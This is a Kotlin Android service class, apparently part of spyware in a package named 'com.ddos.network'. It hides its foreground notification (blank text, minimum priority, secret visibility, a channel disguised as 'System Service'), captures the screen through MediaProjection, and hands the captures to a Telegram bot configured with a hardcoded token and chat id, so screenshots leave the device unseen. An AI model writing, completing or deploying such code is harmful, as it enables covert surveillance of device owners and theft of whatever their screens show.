package com.ddos.network

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class ScreenshotService : Service() {

    private val CHANNEL_ID = "screenshot_service"
    private val NOTIF_ID = 2
    private var mediaProjection: MediaProjection? = null

    override fun onCreate() {
        super.onCreate()
        startSilentForeground()
    }

    private fun startSilentForeground() {
        createSilentChannel()

        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        startForeground(NOTIF_ID, notification)
    }

    private fun createSilentChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            if (it.hasExtra("resultCode") && it.hasExtra("data")) {
                val resultCode = it.getIntExtra("resultCode", 0)
                val data = it.getParcelableExtra<Intent>("data")

                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = projectionManager.getMediaProjection(resultCode, data)

                // Set to ScreenshotTaker
                val bot = TelegramBot(
                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",
                    "8507217564",
                    this
                )
                val screenshotTaker = ScreenshotTaker(this, bot)
                screenshotTaker.setMediaProjection(mediaProjection!!)
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        mediaProjection?.stop()
    }
}
